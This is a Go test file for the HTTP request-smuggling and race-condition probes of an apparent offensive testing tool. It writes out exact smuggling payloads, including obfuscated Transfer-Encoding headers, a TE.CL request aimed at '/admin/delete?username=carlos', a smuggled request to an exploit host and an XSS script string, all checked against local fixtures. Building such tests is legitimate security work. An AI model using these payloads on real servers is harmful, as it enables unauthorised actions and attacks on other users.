package probe

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	rawhttp "github.com/projectdiscovery/rawhttp/client"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/skyrimdlyalohov-droid/omnislash"
)

// rawServer is a single-purpose TCP fixture. handle runs once per accepted
// connection and may read and write freely.
func rawServer(t *testing.T, handle func(net.Conn) error) (addr string, accepts *atomic.Int64) {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	accepts = &atomic.Int64{}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			accepts.Add(1)
			go func() {
				defer conn.Close()
				_ = handle(conn)
			}()
		}
	}()
	return ln.Addr().String(), accepts
}

func writeHTTP(conn net.Conn, status int) error {
	_, err := fmt.Fprintf(conn, "HTTP/1.1 %d %s\r\nContent-Length: 0\r\n\r\n", status, http.StatusText(status))
	return err
}

func writeHTTPBody(conn net.Conn, status int, body string) error {
	_, err := fmt.Fprintf(conn, "HTTP/1.1 %d %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		status, http.StatusText(status), len(body), body)
	return err
}

// readRequest parses one request and drains its body. Draining matters: an
// unread body leaves the next parse inside the previous payload, which is a
// fixture bug, not a smuggling finding.
func readRequest(br *bufio.Reader) (*http.Request, error) {
	req, err := http.ReadRequest(br)
	if err != nil {
		return nil, err
	}
	if req.Body != nil {
		_, _ = io.Copy(io.Discard, req.Body)
		_ = req.Body.Close()
	}
	return req, nil
}

// serveRequests answers n requests on one connection. A request line that was
// prefixed by leftover payload parses as an unknown method, which this fixture
// rejects with 400 - the same reaction a real server has to a corrupted
// request line.
func serveRequests(conn net.Conn, n int) error {
	br := bufio.NewReader(conn)
	for i := 0; i < n; i++ {
		req, err := readRequest(br)
		if err != nil {
			return err
		}
		status := http.StatusOK
		if req.Method != http.MethodGet && req.Method != http.MethodPost {
			status = http.StatusBadRequest
		}
		if err := writeHTTP(conn, status); err != nil {
			return err
		}
	}
	return nil
}

func TestRenderPreservesDuplicateAndObfuscatedHeaders(t *testing.T) {
	raw, err := render(requestSpec{
		Method: "POST",
		Path:   "/",
		Headers: []rawhttp.Header{
			{Key: "Host", Value: "example.test"},
			{Key: "Content-Length", Value: "6"},
			{Key: "Transfer-Encoding", Value: "chunked"},
			{Key: "Transfer-Encoding", Value: "identity"},
			{Key: "Transfer-Encoding ", Value: "chunked"},
		},
		Body: []byte("0\r\n\r\nG"),
	})
	if err != nil {
		t.Fatal(err)
	}
	want := "POST / HTTP/1.1\r\nHost: example.test\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nG"
	if string(raw) != want {
		t.Fatalf("rendered bytes differ:\n got: %q\nwant: %q", raw, want)
	}
}

func TestSmugglingProbeSendsExactBytesOnOneConnection(t *testing.T) {
	addr, accepts := rawServer(t, func(conn net.Conn) error {
		return serveRequests(conn, 3)
	})
	p := &SmugglingProbe{Variant: VariantCLTE, Timeout: 2 * time.Second, Idle: 200 * time.Millisecond}
	res, err := p.Execute(context.Background(), Target{Addr: addr}, mustDial(t, addr))
	if err != nil {
		t.Fatal(err)
	}
	if got := accepts.Load(); got != 1 {
		t.Fatalf("probe opened %d connections, want 1", got)
	}
	if len(res.Exchanges) < 2 {
		t.Fatalf("expected at least baseline and payload writes, got %d", len(res.Exchanges))
	}
	payload := res.Exchanges[1].Raw
	if !strings.Contains(payload, "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n") {
		t.Fatalf("payload lost its framing headers:\n%s", payload)
	}
	if !strings.HasSuffix(payload, "\r\n\r\n0\r\n\r\nG") {
		t.Fatalf("payload body was rewritten:\n%q", payload)
	}
	if !hasFinding(res, "prefix_corruption") {
		t.Fatalf("expected prefix_corruption, findings=%+v", res.Findings)
	}
	if len(res.Responses) < 3 {
		t.Fatalf("expected three responses, got %d", len(res.Responses))
	}
}

func TestSmugglingProbeExecuteMultiUsesFreshConnections(t *testing.T) {
	addr, accepts := rawServer(t, func(conn net.Conn) error {
		_ = conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		_, _ = conn.Read(make([]byte, 4096))
		return writeHTTP(conn, http.StatusOK)
	})
	p := &SmugglingProbe{Variant: VariantCLTE, Timeout: 2 * time.Second, Idle: 200 * time.Millisecond}
	src := &countingSource{addr: addr}
	res, err := p.ExecuteMulti(context.Background(), Target{Addr: addr}, src)
	if err != nil {
		t.Fatal(err)
	}
	if got := accepts.Load(); got != 3 {
		t.Fatalf("accepted connections = %d, want 3 (baseline, payload, victim)", got)
	}
	if got := src.dials.Load(); got != 3 {
		t.Fatalf("source dials = %d, want 3", got)
	}
	if got := len(res.Exchanges); got != 3 {
		t.Fatalf("exchanges = %d, want 3", got)
	}
}

func TestSmugglingProbeReportsExtraResponse(t *testing.T) {
	// The fixture answers the baseline and the payload once each, then answers
	// twice after the victim was written: that is what a front-end emits when it
	// parsed the smuggled request as a separate message.
	addr, _ := rawServer(t, func(conn net.Conn) error {
		br := bufio.NewReader(conn)
		for i := 0; i < 3; i++ {
			if _, err := readRequest(br); err != nil {
				return err
			}
			if err := writeHTTP(conn, http.StatusOK); err != nil {
				return err
			}
		}
		return writeHTTP(conn, http.StatusOK)
	})
	p := &SmugglingProbe{Variant: VariantCLTE, Timeout: 2 * time.Second, Idle: 200 * time.Millisecond}
	res, err := p.Execute(context.Background(), Target{Addr: addr}, mustDial(t, addr))
	if err != nil {
		t.Fatal(err)
	}
	if !hasFinding(res, "extra_response") {
		t.Fatalf("expected extra_response, findings=%+v", res.Findings)
	}
}

func TestRaceProbeSingleWriteBurst(t *testing.T) {
	var mu sync.Mutex
	var requests int
	addr, accepts := rawServer(t, func(conn net.Conn) error {
		br := bufio.NewReader(conn)
		for {
			req, err := http.ReadRequest(br)
			if err != nil {
				return nil
			}
			mu.Lock()
			requests++
			mu.Unlock()
			_ = req.Body.Close()
			if err := writeHTTP(conn, 200); err != nil {
				return nil
			}
		}
	})
	p := &RaceProbe{Count: 6, Timeout: 2 * time.Second, Idle: 200 * time.Millisecond, SingleUse: true}
	res, err := p.Execute(context.Background(), Target{Addr: addr}, mustDial(t, addr))
	if err != nil {
		t.Fatal(err)
	}
	if got := accepts.Load(); got != 1 {
		t.Fatalf("race probe opened %d connections, want 1", got)
	}
	if res.Burst == nil || res.Burst.Writes != 1 || res.Burst.Mode != string(RaceSingleWrite) {
		t.Fatalf("burst = %+v, want one single_write", res.Burst)
	}
	if want := strings.Join(res.Payloads, ""); res.Exchanges[0].Raw != want {
		t.Fatal("the single write is not the concatenation of the burst payloads")
	}
	mu.Lock()
	got := requests
	mu.Unlock()
	if got != 6 {
		t.Fatalf("server received %d requests, want 6", got)
	}
	if len(res.Responses) != 6 {
		t.Fatalf("responses = %d, want 6", len(res.Responses))
	}
	if !hasFinding(res, "race_success") {
		t.Fatalf("expected race_success, findings=%+v", res.Findings)
	}
}

func TestRaceProbeWithoutSingleUseMakesNoVerdict(t *testing.T) {
	addr, _ := rawServer(t, func(conn net.Conn) error {
		return serveRequests(conn, 4)
	})
	// Four successful GETs are evidence, not a race finding: the caller did not
	// declare the action single-use.
	p := &RaceProbe{Count: 4, Method: "GET", Timeout: 2 * time.Second, Idle: 200 * time.Millisecond}
	res, err := p.Execute(context.Background(), Target{Addr: addr}, mustDial(t, addr))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Responses) != 4 {
		t.Fatalf("responses = %d, want 4", len(res.Responses))
	}
	if len(res.Findings) != 0 {
		t.Fatalf("unexpected verdict without SingleUse: %+v", res.Findings)
	}
}

func TestRaceProbeLastByteMode(t *testing.T) {
	addr, _ := rawServer(t, func(conn net.Conn) error {
		return serveRequests(conn, 3)
	})
	p := &RaceProbe{Count: 3, Mode: RaceLastByte, Hold: 20 * time.Millisecond, Timeout: 2 * time.Second, Idle: 200 * time.Millisecond}
	res, err := p.Execute(context.Background(), Target{Addr: addr}, mustDial(t, addr))
	if err != nil {
		t.Fatal(err)
	}
	if res.Burst == nil || res.Burst.Writes != 2 || res.Burst.Mode != string(RaceLastByte) {
		t.Fatalf("burst = %+v, want two writes in last_byte mode", res.Burst)
	}
	if len(res.Exchanges) != 2 {
		t.Fatalf("exchanges = %d, want 2", len(res.Exchanges))
	}
	if n := len(res.Exchanges[1].Raw); n != 3 {
		t.Fatalf("final write has %d bytes, want 3 final bytes", n)
	}
}

func TestAttributionFromConnection(t *testing.T) {
	addr, _ := rawServer(t, func(conn net.Conn) error {
		return serveRequests(conn, 1)
	})
	pr := &omnislash.Proxy{Scheme: "http", Addr: "203.0.113.7:8080"}
	conn := proxyConn{Conn: mustDial(t, addr), proxy: pr}
	got := attributionOf(conn)
	if !got.Verified || got.Proxy != "http://203.0.113.7:8080" {
		t.Fatalf("attribution = %+v", got)
	}
	if got.ExitIP != "" {
		t.Fatalf("unvalidated proxy must not claim an exit IP, got %q", got.ExitIP)
	}
}

func TestAttributionUnwrapsTLS(t *testing.T) {
	addr, _ := rawServer(t, func(conn net.Conn) error {
		return serveRequests(conn, 1)
	})
	pr := &omnislash.Proxy{Scheme: "socks5", Addr: "198.51.100.9:1080"}
	raw := proxyConn{Conn: mustDial(t, addr), proxy: pr}
	tc := tls.Client(raw, &tls.Config{InsecureSkipVerify: true})
	if got := attributionOf(tc); !got.Verified || got.Proxy != "socks5://198.51.100.9:1080" {
		t.Fatalf("TLS attribution = %+v", got)
	}
}

func TestH2RaceLastFrameSync(t *testing.T) {
	var hits atomic.Int64
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		_, _ = io.Copy(io.Discard, r.Body)
		w.WriteHeader(http.StatusOK)
	}))
	srv.EnableHTTP2 = true
	srv.StartTLS()
	defer srv.Close()

	addr := strings.TrimPrefix(srv.URL, "https://")
	conn, err := tls.Dial("tcp", addr, &tls.Config{InsecureSkipVerify: true, NextProtos: []string{"h2"}})
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()

	p := &H2RaceProbe{Count: 5, Hold: 30 * time.Millisecond, Timeout: 3 * time.Second, Idle: time.Second, Body: []byte("x=1")}
	res, err := p.Execute(context.Background(), Target{Addr: addr, Host: addr, Path: "/race"}, conn)
	if err != nil {
		t.Fatal(err)
	}
	if got := hits.Load(); got != 5 {
		t.Fatalf("server handled %d requests, want 5", got)
	}
	if len(res.Responses) != 5 {
		t.Fatalf("responses = %d, want 5", len(res.Responses))
	}
	for _, r := range res.Responses {
		if r.Status != http.StatusOK {
			t.Fatalf("status = %d, want 200", r.Status)
		}
	}
}

func TestSmuggleChainProbeConfirmsGPOST(t *testing.T) {
	// The fixture models a front-end that closes each client connection but
	// keeps the back-end socket: the payload's chunked body ends before "G",
	// and the next connection's request line is prefixed with it.
	var mu sync.Mutex
	leftover := ""
	addr, _ := rawServer(t, func(conn net.Conn) error {
		br := bufio.NewReader(conn)
		mu.Lock()
		prefix := leftover
		mu.Unlock()
		if prefix != "" {
			line, err := br.ReadString('\n')
			if err != nil {
				return err
			}
			if strings.HasPrefix(prefix+line, "GPOST ") {
				return writeHTTPBody(conn, http.StatusForbidden, `"Unrecognized method GPOST"`)
			}
			return writeHTTP(conn, http.StatusOK)
		}
		req, err := readRequest(br)
		if err != nil {
			return err
		}
		_ = req
		// http.ReadRequest with chunked encoding stops after the 0 chunk and
		// leaves the smuggling byte in the reader.
		b, err := br.ReadByte()
		if err == nil {
			mu.Lock()
			leftover = string(b)
			mu.Unlock()
		}
		return writeHTTP(conn, http.StatusOK)
	})

	src := &countingSource{addr: addr}
	p := &SmuggleChainProbe{
		VictimMethod:    "POST",
		SuccessContains: "Unrecognized method GPOST",
		Attempts:        2,
		Timeout:         2 * time.Second,
		Idle:            200 * time.Millisecond,
	}
	res, err := p.ExecuteMulti(context.Background(), Target{Addr: addr}, src)
	if err != nil {
		t.Fatal(err)
	}
	if !hasFinding(res, "smuggle_confirmed") {
		t.Fatalf("expected smuggle_confirmed, findings=%+v", res.Findings)
	}
	if src.dials.Load() != 2 {
		t.Fatalf("source dials = %d, want 2", src.dials.Load())
	}
	if len(res.Exchanges) < 2 || len(res.Responses) < 2 {
		t.Fatalf("exchanges=%d responses=%d, want at least 2/2", len(res.Exchanges), len(res.Responses))
	}
	var statuses []int
	for _, r := range res.Responses {
		statuses = append(statuses, r.Status)
	}
	if statuses[len(statuses)-1] != http.StatusForbidden {
		t.Fatalf("statuses = %v, want the last response to be 403", statuses)
	}
}

func TestSmuggleChainProbeRetriesWithFreshPayloadConn(t *testing.T) {
	// No leftover state: every response is a plain 200, so the probe must run
	// all attempts and report unconfirmed. The fixture records the bytes each
	// connection received, which shows whether attempt 2 planted its payload on
	// a new socket or wrote it into the previous victim connection.
	var mu sync.Mutex
	var received []string
	addr, accepts := rawServer(t, func(conn net.Conn) error {
		_ = conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
		var buf []byte
		tmp := make([]byte, 4096)
		for {
			n, err := conn.Read(tmp)
			if n > 0 {
				buf = append(buf, tmp[:n]...)
			}
			if err != nil {
				break
			}
		}
		mu.Lock()
		received = append(received, string(buf))
		mu.Unlock()
		return writeHTTP(conn, http.StatusOK)
	})

	src := &countingSource{addr: addr}
	p := &SmuggleChainProbe{
		VictimMethod:    "POST",
		SuccessContains: "Unrecognized method GPOST",
		Attempts:        2,
		Timeout:         2 * time.Second,
		Idle:            250 * time.Millisecond,
	}
	res, err := p.ExecuteMulti(context.Background(), Target{Addr: addr}, src)
	if err != nil {
		t.Fatal(err)
	}
	if !hasFinding(res, "smuggle_chain_unconfirmed") {
		t.Fatalf("findings = %+v, want smuggle_chain_unconfirmed", res.Findings)
	}
	if got := src.dials.Load(); got != 4 {
		t.Fatalf("source dials = %d, want 4 (payload+victim per attempt)", got)
	}
	if got := accepts.Load(); got != 4 {
		t.Fatalf("accepted connections = %d, want 4", got)
	}

	mu.Lock()
	defer mu.Unlock()
	if len(received) != 4 {
		t.Fatalf("recorded connections = %d, want 4", len(received))
	}
	for i, raw := range received {
		isPayload := i%2 == 0
		hasChunked := strings.Contains(raw, "Transfer-Encoding: chunked")
		switch {
		case isPayload && !hasChunked:
			t.Fatalf("connection %d is a payload socket but received no chunked body: %q", i, raw)
		case !isPayload && hasChunked:
			t.Fatalf("connection %d is a victim socket but received the payload: %q", i, raw)
		}
	}
}

func TestSmuggleChainTECLPayloadBytes(t *testing.T) {
	p := &SmuggleChainProbe{
		Variant:        VariantTECL,
		SmuggledMethod: "GET",
		SmuggledPath:   "/admin/delete?username=carlos",
		SmuggledHost:   "localhost",
	}
	got, err := p.buildTECL(Target{Addr: "lab.test:443", Host: "lab.test"})
	if err != nil {
		t.Fatal(err)
	}
	want := "POST / HTTP/1.1\r\nHost: lab.test\r\nUser-Agent: omnislash-probe/1\r\n" +
		"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n" +
		"87\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\n" +
		"x=1\r\n0\r\n\r\n"
	if string(got) != want {
		t.Fatalf("TE.CL payload =\n%q\nwant\n%q", got, want)
	}
}

func TestSmuggleChainTECLAcceptsMarkerOnPayloadResponse(t *testing.T) {
	addr, _ := rawServer(t, func(conn net.Conn) error {
		return writeHTTPBody(conn, http.StatusOK, "Congratulations, you solved the lab!")
	})
	p := &SmuggleChainProbe{
		Variant:         VariantTECL,
		SmuggledPath:    "/admin/delete?username=carlos",
		SmuggledHost:    "localhost",
		SuccessContains: "Congratulations",
		Attempts:        1,
		Timeout:         2 * time.Second,
		Idle:            200 * time.Millisecond,
	}
	res, err := p.ExecuteMulti(context.Background(), Target{Addr: addr, Host: "lab.test"}, &countingSource{addr: addr})
	if err != nil {
		t.Fatal(err)
	}
	if !hasFinding(res, "smuggle_confirmed") {
		t.Fatalf("findings = %+v, want smuggle_confirmed from the payload response", res.Findings)
	}
}

func TestH2CLBuildSmuggledRequest(t *testing.T) {
	p := &H2CLProbe{
		SmuggledMethod: "GET",
		SmuggledPath:   "/exploit",
		SmuggledHost:   "exploit.example.net",
	}
	got, err := p.buildSmuggled(Target{Addr: "lab.example.net:443", Host: "lab.example.net"})
	if err != nil {
		t.Fatal(err)
	}
	want := "GET /exploit HTTP/1.1\r\nHost: exploit.example.net\r\n\r\n"
	if string(got) != want {
		t.Fatalf("smuggled request = %q, want %q", got, want)
	}
}

func TestH2CLPrefixAlignsWithDeclaredLength(t *testing.T) {
	p := &H2CLProbe{
		SmuggledPrefix: "AAAAAAAAAAAAAAAAAAAA",
		SmuggledMethod: "GET",
		SmuggledPath:   "/exploit",
		SmuggledHost:   "exploit.example.net",
	}
	got, err := p.buildSmuggled(Target{Addr: "lab.example.net:443", Host: "lab.example.net"})
	if err != nil {
		t.Fatal(err)
	}
	if len(p.SmuggledPrefix) != 20 {
		t.Fatalf("prefix length = %d, want 20", len(p.SmuggledPrefix))
	}
	if !strings.HasPrefix(string(got), p.SmuggledPrefix+"GET /exploit HTTP/1.1\r\n") {
		t.Fatalf("prefixed request = %q", got)
	}
}

func TestH2CLProbeExecuteRejectsSingleConn(t *testing.T) {
	p := &H2CLProbe{}
	if _, err := p.Execute(context.Background(), Target{Addr: "127.0.0.1:1"}, nil); !errors.Is(err, ErrMultiConn) {
		t.Fatalf("Execute error = %v, want ErrMultiConn", err)
	}
}

func TestSmuggleChainProbeExecuteRejectsSingleConn(t *testing.T) {
	p := &SmuggleChainProbe{}
	if _, err := p.Execute(context.Background(), Target{Addr: "127.0.0.1:1"}, nil); !errors.Is(err, ErrMultiConn) {
		t.Fatalf("Execute error = %v, want ErrMultiConn", err)
	}
}

type countingSource struct {
	addr  string
	dials atomic.Int64
}

func (s *countingSource) Dial(ctx context.Context) (net.Conn, error) {
	s.dials.Add(1)
	d := net.Dialer{Timeout: 2 * time.Second}
	return d.DialContext(ctx, "tcp", s.addr)
}

func TestBuildTunnelPath(t *testing.T) {
	got := buildTunnelPath(
		"/",
		"lab.test",
		"lab.test",
		"/resources?<script>alert(1)</script>",
		[]string{"/a.svg", "/b.jpg"},
		"NONCE",
	)
	want := "/ HTTP/1.1\r\nHost: lab.test\r\n\r\n" +
		"GET /resources?<script>alert(1)</script> HTTP/1.1\r\nHost: lab.test\r\n\r\n" +
		"GET /a.svg HTTP/1.1\r\nHost: lab.test\r\n\r\n" +
		"GET /b.jpg HTTP/1.1\r\nHost: lab.test\r\n" +
		"X-Omnislash-Tunnel: NONCE"
	if got != want {
		t.Fatalf("tunnel path =\n%q\nwant\n%q", got, want)
	}
}

func TestH2TunnelProbeRejectsNonTLS(t *testing.T) {
	client, server := net.Pipe()
	defer client.Close()
	defer server.Close()
	if _, err := (&H2TunnelProbe{}).Execute(context.Background(), Target{Addr: "lab.test:443"}, client); err == nil {
		t.Fatal("plain connection was accepted by the h2 tunnel probe")
	}
}

func TestH2TunnelReadsHeadResponseWithData(t *testing.T) {
	// The whole point of the tunnel is a HEAD response that carries DATA
	// anyway, so the frame reader must not enforce HTTP/2 Content-Length.
	client, server := net.Pipe()
	defer client.Close()
	defer server.Close()

	e := newExec(context.Background(), "test", Target{Addr: "lab.test:443"}, client, time.Second, 0, 0)
	fr := http2.NewFramer(client, client)
	fr.ReadMetaHeaders = hpack.NewDecoder(4096, nil)
	tunnel := &h2Tunnel{e: e, fr: fr, nextID: 1, maxBody: defaultMaxBody, host: "lab.test"}

	done := make(chan error, 1)
	go func() {
		// net.Pipe writes block until the peer reads: drain the client's
		// SETTINGS ACK and WINDOW_UPDATE frames concurrently.
		go func() { _, _ = io.Copy(io.Discard, server) }()

		w := http2.NewFramer(server, nil)
		if err := w.WriteSettings(); err != nil {
			done <- err
			return
		}
		var hb bytes.Buffer
		enc := hpack.NewEncoder(&hb)
		for _, field := range []hpack.HeaderField{
			{Name: ":status", Value: "200"},
			{Name: "content-type", Value: "text/html"},
			{Name: "content-length", Value: "6"},
		} {
			if err := enc.WriteField(field); err != nil {
				done <- err
				return
			}
		}
		if err := w.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      1,
			BlockFragment: hb.Bytes(),
			EndHeaders:    true,
		}); err != nil {
			done <- err
			return
		}
		if err := w.WriteData(1, false, []byte("abc")); err != nil {
			done <- err
			return
		}
		if err := w.WriteData(1, true, []byte("def")); err != nil {
			done <- err
			return
		}
		done <- nil
	}()

	resp, err := tunnel.readStream(context.Background(), 1, time.Second)
	if err != nil {
		t.Fatal(err)
	}
	if resp.status != http.StatusOK {
		t.Fatalf("status = %d, want 200", resp.status)
	}
	if got := string(resp.body); got != "abcdef" {
		t.Fatalf("body = %q, want %q", got, "abcdef")
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
}

func hasFinding(res *Result, kind string) bool {
	for _, f := range res.Findings {
		if f.Kind == kind {
			return true
		}
	}
	return false
}

func mustDial(t *testing.T, addr string) net.Conn {
	t.Helper()
	conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = conn.Close() })
	return conn
}

// proxyConn models the tracked connection omnislash returns: it carries the
// proxy handle that attribution reads.
type proxyConn struct {
	net.Conn
	proxy *omnislash.Proxy
}

func (c proxyConn) Proxy() *omnislash.Proxy { return c.proxy }
